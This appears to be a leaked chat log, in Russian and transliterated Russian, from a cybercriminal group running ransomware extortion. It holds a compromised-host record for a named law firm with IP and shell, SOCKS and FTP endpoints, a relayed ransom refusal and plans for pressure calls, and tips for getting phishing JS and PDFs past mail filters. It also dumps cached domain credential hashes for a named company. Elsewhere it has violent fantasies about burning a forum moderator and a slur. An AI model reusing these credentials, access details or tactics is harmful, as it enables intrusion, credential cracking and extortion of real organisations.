+--------------------
+[2023-12-17 17:48:18] @usernamegg:matrix.bestflowers247.online: столько человек за нас отписало
+--------------------
+[2023-12-17 17:48:28] @usernamegg:matrix.bestflowers247.online: модер все побанил и всем предупреждения выдал
+--------------------
+[2023-12-17 17:48:29] @usernamenn:matrix.bestflowers247.online: да ладно где отписали?
+--------------------
+[2023-12-17 17:48:32] @usernamegg:matrix.bestflowers247.online: а нас забанил
+--------------------
+[2023-12-17 17:48:35] @usernamenn:matrix.bestflowers247.online: а что отписали?)
+--------------------
+[2023-12-17 17:48:36] @usernamegg:matrix.bestflowers247.online: уебок что ли
+--------------------
+[2023-12-17 17:48:42] @usernamenn:matrix.bestflowers247.online: пиздец
+--------------------
+[2023-12-17 17:49:03] @usernamegg:matrix.bestflowers247.online: что отказаться от гаранта это вообще не повод нам бан выписывать )
+--------------------
+[2023-12-17 17:49:07] @usernamegg:matrix.bestflowers247.online: левые люди
+--------------------
+[2023-12-17 17:49:14] @usernamegg:matrix.bestflowers247.online: я никого не просил писать даже
+--------------------
+[2023-12-17 17:49:19] @usernamegg:matrix.bestflowers247.online: просто бред ебаный
+--------------------
+[2023-12-17 17:49:51] @usernamegg:matrix.bestflowers247.online: ладно примем достойно этот бред ебаный и купим алл с давней регой
+--------------------
+[2023-12-17 17:49:58] @usernamegg:matrix.bestflowers247.online: долбоебы я ничего не могу сказать больше
+--------------------
+[2023-12-17 17:50:11] @cob_crypt_ward:matrix.bestflowers247.online: посмотрел если что bounceblack, сейчас нужно с репетитором позаниматься, потом напишу в чат что и куда, ок?
+--------------------
+[2023-12-17 17:51:46] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 17:51:48] @usernamegg:matrix.bestflowers247.online: завтра
+--------------------
+[2023-12-17 17:52:00] @usernamegg:matrix.bestflowers247.online: не к спеху
+--------------------
+[2023-12-17 17:52:29] @usernamegg:matrix.bestflowers247.online: мы на отдыха сегодня ушли, работы много сделано за неделю. завтра в снова рабочий день
+--------------------
+[2023-12-17 17:53:07] @usernamegg:matrix.bestflowers247.online: * мы на отдых сегодня ушли, работы много сделано за неделю. завтра в снова рабочий день
+--------------------
+[2023-12-17 17:53:17] @usernamegg:matrix.bestflowers247.online: * мы на отдых сегодня ушли, работы много сделано за неделю. завтра снова рабочий день
+--------------------
+[2023-12-17 18:03:17] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> ладно примем достойно этот бред ебаный и купим алл с давней регой
+
+))
+--------------------
+[2023-12-17 18:03:29] @usernamenn:matrix.bestflowers247.online: может написать админу?
+--------------------
+[2023-12-17 18:03:37] @usernamegg:matrix.bestflowers247.online: * ладно примем достойно этот бред ебаный и купим акк с давней регой
+--------------------
+[2023-12-17 18:03:47] @usernamegg:matrix.bestflowers247.online: > <@usernamenn:matrix.bestflowers247.online> может написать админу?
+
+напишу
+--------------------
+[2023-12-17 18:03:51] @usernamenn:matrix.bestflowers247.online: я помню раньше хорошо общался с админом экспы он шел на какие то уступки но это было ебать давно))
+--------------------
+[2023-12-17 18:04:15] @usernamenn:matrix.bestflowers247.online: он нам на нашем акке удалял сообщения на форуме
+--------------------
+[2023-12-17 18:04:26] @usernamenn:matrix.bestflowers247.online: старые какие то где были оставлены жабы итд
+--------------------
+[2023-12-17 18:04:34] @usernamenn:matrix.bestflowers247.online: тогда редактировать вроде нельзя было сообщения
+--------------------
+[2023-12-17 18:07:28] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2023-12-17 в 21.07.14.png
+--------------------
+[2023-12-17 18:07:43] @usernamegg:matrix.bestflowers247.online: > <@usernamenn:matrix.bestflowers247.online> он нам на нашем акке удалял сообщения на форуме
+
+жесть )
+--------------------
+[2023-12-17 18:08:03] @usernamegg:matrix.bestflowers247.online: это у лучшему что забанили
+--------------------
+[2023-12-17 18:08:06] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> жесть )
+
+да не это по просьбе же
+--------------------
+[2023-12-17 18:08:07] @usernamegg:matrix.bestflowers247.online: новый акк
+--------------------
+[2023-12-17 18:08:14] @usernamegg:matrix.bestflowers247.online: новый человек
+--------------------
+[2023-12-17 18:08:36] @usernamegg:matrix.bestflowers247.online: нет человека нет проблемы, нет тела - нет дела!
+--------------------
+[2023-12-17 18:10:08] @usernamenn:matrix.bestflowers247.online: ))))
+--------------------
+[2023-12-17 18:10:25] @usernamegg:matrix.bestflowers247.online: нужная очень сильная печь
+--------------------
+[2023-12-17 18:10:37] @usernamegg:matrix.bestflowers247.online: либо по частям )
+--------------------
+[2023-12-17 18:10:40] @usernamenn:matrix.bestflowers247.online: пиздец ну бан это жоостко
+--------------------
+[2023-12-17 18:10:55] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 18:12:41] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2023-12-17 в 21.11.54.png
+--------------------
+[2023-12-17 18:12:44] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2023-12-17 в 21.12.02.png
+--------------------
+[2023-12-17 18:13:02] @usernamegg:matrix.bestflowers247.online: вот я бы его в печку засунул , даже бы не маргнул , очень хочу таких сжигать что бы даже костей не осталось
+--------------------
+[2023-12-17 18:13:10] @usernamegg:matrix.bestflowers247.online: прах )
+--------------------
+[2023-12-17 18:14:16] @usernamegg:matrix.bestflowers247.online: 1200px-Feuerhalle_Simmering_Ofen.jpg
+--------------------
+[2023-12-17 18:15:21] @usernamegg:matrix.bestflowers247.online: 832791d961d2eb5011c605046686c390.jpeg
+--------------------
+[2023-12-17 18:15:23] @cameron777:matrix.org: > <@cameron777:matrix.org> https://www.zoominfo.com/c/barrack-rodos--bacine/3998523
+>
+> Barrack Rodos & Bacine
+>
+> Law Firms & Legal Services · Pennsylvania, United States · 63 Employees
+>
+> Barrack, Rodos & Bacine is a highly experienced securities litigation firm with offices in Philadelphia, PA, New York City, NY, and San Diego, CA. During its more than 40 years in practice, BR&B has recovered over ten billion dollars on behalf of victims of corpora
+>
+> Revenue
+> $15.9M
+> Industry
+>
+> Industry
+> Law Firms & Legal Services
+>
+>
+> ```
+> Bot ID	BRBWRK1_zwashington_59C9127F
+> IP | Country	50.238.167.2 | US
+> Domain | Hosts	barrack.com
+>
+>
+> Shell 13.57.243.97:18869
+> Socks 13.57.243.97:13028
+> FTP   13.57.243.97:15597
+>
+> Antivirus Processes (2)
+> SentinelOne
+> SentinelOne Singularity XDR
+> ```
+
+vishlo deshnut' admina?
+--------------------
+[2023-12-17 18:15:34] @usernamegg:matrix.bestflowers247.online: нихуя не остается от человека )
+--------------------
+[2023-12-17 18:15:43] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> vishlo deshnut' admina?
+
+не расшифровали еще
+--------------------
+[2023-12-17 18:16:07] @usernamenn:matrix.bestflowers247.online: я не понял связи между баном и человеком
+--------------------
+[2023-12-17 18:16:23] @usernamegg:matrix.bestflowers247.online: > <@usernamenn:matrix.bestflowers247.online> я не понял связи между баном и человеком
+
+я злой на таких тварей
+--------------------
+[2023-12-17 18:16:43] @usernamegg:matrix.bestflowers247.online: на ровном месте уебали акк на котором я делал историю хорошую.
+--------------------
+[2023-12-17 18:17:12] @usernamenn:matrix.bestflowers247.online: да это к лучшему
+--------------------
+[2023-12-17 18:17:14] @usernamenn:matrix.bestflowers247.online: не гони
+--------------------
+[2023-12-17 18:17:20] @usernamenn:matrix.bestflowers247.online: давно надо было сменить акк
+--------------------
+[2023-12-17 18:17:29] @usernamenn:matrix.bestflowers247.online: висеть в том деле на 1 акке не есть хорошо
+--------------------
+[2023-12-17 18:17:34] @usernamenn:matrix.bestflowers247.online: это мониторинг и вся хуйня
+--------------------
+[2023-12-17 18:17:37] @usernamenn:matrix.bestflowers247.online: нахуй оно надо
+--------------------
+[2023-12-17 18:17:44] @usernamegg:matrix.bestflowers247.online: есть такое
+--------------------
+[2023-12-17 18:17:47] @usernamenn:matrix.bestflowers247.online: висеть на 1 акке хуево
+--------------------
+[2023-12-17 18:17:47] @usernamegg:matrix.bestflowers247.online: к лучшему
+--------------------
+[2023-12-17 18:17:55] @usernamegg:matrix.bestflowers247.online: но его в печку я бы засунул
+--------------------
+[2023-12-17 18:18:02] @usernamenn:matrix.bestflowers247.online: то что забанили заебись, лучше вобще пусть удалят все внешние сообщения
+--------------------
+[2023-12-17 18:18:06] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> но его в печку я бы засунул
+
+)))
+--------------------
+[2023-12-17 18:19:07] @usernameugway:matrix.bestflowers247.online: бро привет
+--------------------
+[2023-12-17 18:19:15] @usernameugway:matrix.bestflowers247.online: в общем должна транза в итоге, но прошли почти сутки
+--------------------
+[2023-12-17 18:19:15] @usernamegg:matrix.bestflowers247.online: ку
+--------------------
+[2023-12-17 18:19:18] @usernameugway:matrix.bestflowers247.online: было страшно)
+--------------------
+[2023-12-17 18:19:30] @usernameugway:matrix.bestflowers247.online: есть нормальная нагрузка?
+--------------------
+[2023-12-17 18:19:54] @usernameugway:matrix.bestflowers247.online: * в общем дошла транза в итоге, но прошли почти сутки
+--------------------
+[2023-12-17 18:20:19] @usernameugway:matrix.bestflowers247.online: под спуф и/или под тимс
+--------------------
+[2023-12-17 18:20:23] @usernamegg:matrix.bestflowers247.online: нет)
+--------------------
+[2023-12-17 18:20:38] @usernamegg:matrix.bestflowers247.online: ты уехал ?
+--------------------
+[2023-12-17 18:20:59] @usernameugway:matrix.bestflowers247.online: да, утром в офис. я наверно тогда приеду как ты закончишь работу
+--------------------
+[2023-12-17 18:21:04] @usernameugway:matrix.bestflowers247.online: чтобы спокойно увидеться и я тебя не дергал
+--------------------
+[2023-12-17 18:21:44] @usernameugway:matrix.bestflowers247.online: > нет)
+
+нет прогнозов когда появится что-то стоящее ? почему такая жопа настала)
+--------------------
+[2023-12-17 18:21:53] @usernameugway:matrix.bestflowers247.online: вроде доставка есть, а доставлять нечего(
+--------------------
+[2023-12-17 18:22:06] @usernamegg:matrix.bestflowers247.online: ну я собираю js
+--------------------
+[2023-12-17 18:22:10] @usernamegg:matrix.bestflowers247.online: шлю его
+--------------------
+[2023-12-17 18:22:14] @usernamegg:matrix.bestflowers247.online: + pdf
+--------------------
+[2023-12-17 18:22:47] @usernameugway:matrix.bestflowers247.online: ссылку в пдф зашиваешь ?
+--------------------
+[2023-12-17 18:22:58] @usernamenn:matrix.bestflowers247.online: AGCNA поставили ведь?
+--------------------
+[2023-12-17 18:23:08] @usernamenn:matrix.bestflowers247.online: я бы exit сделал там где стучат в кобы
+--------------------
+[2023-12-17 18:23:21] @usernamenn:matrix.bestflowers247.online: что бы не побанили быстро их
+--------------------
+[2023-12-17 18:23:31] @usernameugway:matrix.bestflowers247.online: ссылки сжирает почти все пруфпоинт, только если пдф в дропбокс запихнуть, тогда пройдет
+--------------------
+[2023-12-17 18:24:33] @cameron777:matrix.org: ku
+--------------------
+[2023-12-17 18:26:56] @cameron777:matrix.org: etim uristam nado zvoit', oni ne vkurse vsego etogo
+etot ITishnik za nos vodit ix
+--------------------
+[2023-12-17 18:28:05] @cameron777:matrix.org: I reiterate that we are unable to pay the amounts you are asking. When you re ready to present realistic numbers, then we can talk about that. In the meantime we are recovering our systems.
+
+chto i vchera pisal ya
+on vsem skazal chto tipo slomalos tam chto to i vse pochinit skoro
+
+--------------------
+[2023-12-17 20:35:40] @w:matrixtcFJHPDblmt2rg.network: Бурито протестировал подпись файлов, все окей
+--------------------
+[2023-12-17 21:14:13] @burito:matrix.bestflowers247.online: привет. завтра буду после обеда
+--------------------
+[2023-12-17 21:14:22] @burito:matrix.bestflowers247.online: с подписью разобрались
+--------------------
+[2023-12-17 21:17:33] @usernamenn:matrix.bestflowers247.online: ```
+cf5b1e235948513be9ea2c11a701f0b4
+6888875a6305e261d6df2c75e429c4c7
+4ebbc578ea0f42190d9c70984144b702
+54e721b2b7b39ddde031c3342ed574e3
+```
+--------------------
+[2023-12-17 22:58:33] @usernamegg:matrix.bestflowers247.online: это очень хорошо
+--------------------
+[2023-12-17 22:58:39] @usernamegg:matrix.bestflowers247.online: +++
+--------------------
+[2023-12-17 22:59:55] @usernamegg:matrix.bestflowers247.online: там не IT
+--------------------
+[2023-12-17 23:00:07] @usernamegg:matrix.bestflowers247.online: это переговрщика они наняли
+--------------------
+[2023-12-17 23:00:10] @usernamegg:matrix.bestflowers247.online: рековери
+--------------------
+[2023-12-17 23:00:27] @usernamegg:matrix.bestflowers247.online: пидарас там заднеприводный сидит )
+--------------------
+[2023-12-17 23:00:39] @usernamegg:matrix.bestflowers247.online: сегодня закажу несколько звонков
+--------------------
+[2023-12-17 23:51:11] @usernamenn:matrix.bestflowers247.online: ```
+GLOBAL.ONTEX.NET/122420:$DCC2$10240#122420#4c1f646b56cbfb5eaa93afdb1cd41617
+GLOBAL.ONTEX.NET/127490:$DCC2$10240#127490#aa6cb147db9e26c99857a5e295d5d4a2
+GLOBAL.ONTEX.NET/126960:$DCC2$10240#126960#86107666edd08ff140d0980c5df853fe
+GLOBAL.ONTEX.NET/127600:$DCC2$10240#127600#05b48b68491e64c3199433b69958bbe8
+GLOBAL.ONTEX.NET/120041:$DCC2$10240#120041#a0f6bf54f1c9203fcfafb859ae24277f
+GLOBAL.ONTEX.NET/111010:$DCC2$10240#111010#ef0963b3031a9f4d23ba5af92a0142bc
+GLOBAL.ONTEX.NET/121620:$DCC2$10240#121620#51002f9d291688dc1025ef7626aeefa6
+GLOBAL.ONTEX.NET/117400:$DCC2$10240#117400#12d1db7568336a34314cd00942b840f4
+GLOBAL.ONTEX.NET/111720:$DCC2$10240#111720#8e7ddd4ae6f1fd19b6c4f8b648f85dd6
+GLOBAL.ONTEX.NET/128570:$DCC2$10240#128570#ae28f8f7ae3d749d91052b3b324b2be9
+GLOBAL.ONTEX.NET/126490:$DCC2$10240#126490#cde94cce4902aa62c2ee2c16a7598967
+GLOBAL.ONTEX.NET/109329:$DCC2$10240#109329#6bb7f70ccee712285330f63f16dcb06a
+GLOBAL.ONTEX.NET/119870:$DCC2$10240#119870#8427af79688939baefbaf98af75db9bd
+GLOBAL.ONTEX.NET/119490:$DCC2$10240#119490#8dc4ff4b99b1af424ae25a6c6694af6f
+GLOBAL.ONTEX.NET/123590:$DCC2$10240#123590#366a282293a8e9b2c2d054708cdb97ef
+GLOBAL.ONTEX.NET/111009:$DCC2$10240#111009#994a98d0955901d2aea1c50a117617f7
+GLOBAL.ONTEX.NET/131490:$DCC2$10240#131490#a3524f48f6f7833676623f850dfb969b
+GLOBAL.ONTEX.NET/111640:$DCC2$10240#111640#6fd97b975c655c089addbb939ea3d4d5
+GLOBAL.ONTEX.NET/120032:$DCC2$10240#120032#20379e4d8f647c571a7b2c22542ea577
+GLOBAL.ONTEX.NET/167831:$DCC2$10240#167831#9e4257dff066e582e1e6ad84c29a2780
+GLOBAL.ONTEX.NET/122730:$DCC2$10240#122730#b4ba1a2177826150d83b3bc61cd8e5de
+GLOBAL.ONTEX.NET/121301:$DCC2$10240#121301#4b578d757a67eae95e6bdfa723f37ba0
+```
+--------------------
+[2023-12-17 23:55:19] @cameron777:matrix.org: > <@usernamejj:matrix.bestflowers247.online> не расшифровали еще
+
+vse esho tixo po nemu ?
+
+--------------------
